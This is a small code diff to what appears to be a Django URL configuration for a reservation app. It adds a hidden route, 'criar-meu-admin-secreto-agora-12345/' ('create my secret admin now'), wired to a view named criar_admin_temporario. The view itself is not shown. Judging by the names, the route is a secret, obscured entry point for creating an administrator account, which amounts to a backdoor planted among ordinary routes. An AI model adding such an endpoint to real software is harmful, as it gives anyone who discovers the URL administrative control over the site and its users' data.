@@ -11,4 +11,5 @@ urlpatterns = [
     
     # URL de edição
     path('reserva/editar/<int:id>/', views.editar_reserva, name='editar_reserva'),
+    path('criar-meu-admin-secreto-agora-12345/', views.criar_admin_temporario, name='criar_admin_temp'),
 ]
